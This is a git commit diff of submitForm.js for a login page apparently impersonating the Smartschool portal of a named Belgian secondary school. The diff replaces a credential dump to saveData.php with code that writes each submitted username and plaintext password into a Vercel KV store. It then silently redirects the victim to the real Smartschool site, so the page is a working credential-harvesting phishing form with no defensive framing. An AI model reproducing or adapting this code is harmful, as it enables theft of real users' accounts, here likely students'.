e8391d6b953abc129eb0ff85b7c2ea0a30783a6f
RyZe999123 <157278555+RyZe999123@users.noreply.github.com>
2024-09-25 20:35:54 +0100

    Update submitForm.js

--- submitForm.js
+++ submitForm.js
@@ -1,4 +1,4 @@
-function submitForm(event) {
+async function submitForm(event) {
     event.preventDefault(); // Empêche le rechargement de la page
 
     const username = document.getElementById('username').value;
@@ -9,51 +9,19 @@ function submitForm(event) {
         password: password
     };
 
-    // Save data to saveData.php
-    fetch('saveData.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log('Données envoyées avec succès:', data);
-    })
-    .catch(error => {
-        console.error('Erreur:', error);
-    });
+    try {
+        // Enregistrer les données dans Vercel KV
+        await saveDataToKV(data);
+        console.log('Données envoyées avec succès');
 
-    // Login to Smartschool
-    fetch('https://ebr-secondaire.smartschool.be/api/login', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            username: username,
-            password: password
-        })
-    })
-    .then(response => {
-        console.log('Réponse de l\'API:', response);
-        if (response.redirected) {
-            window.location.href = response.url; // Handle redirection
-        } else {
-            return response.json();
-        }
-    })
-    .then(data => {
-        console.log('Données de l\'API:', data);
-        if (data && data.success) {
-            console.log('Connexion réussie', data);
-            // Rediriger vers Smartschool après une connexion réussie
-            window.location.href = 'https://ebr-secondaire.smartschool.be';
-        } else if (data) {
-            console.error('Erreur de connexion', data.message);
-            // Afficher un message d'erreur
-        }
-    })
-    .catch(error => console.error('Erreur:', error));
+        // Rediriger vers Smartschool
+        window.location.href = 'https://ebr-secondaire.smartschool.be';
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Une erreur est survenue. Veuillez réessayer.');
+    }
+}
+
+async function saveDataToKV(data) {
+    await kv.set(data.username, data.password);
 }
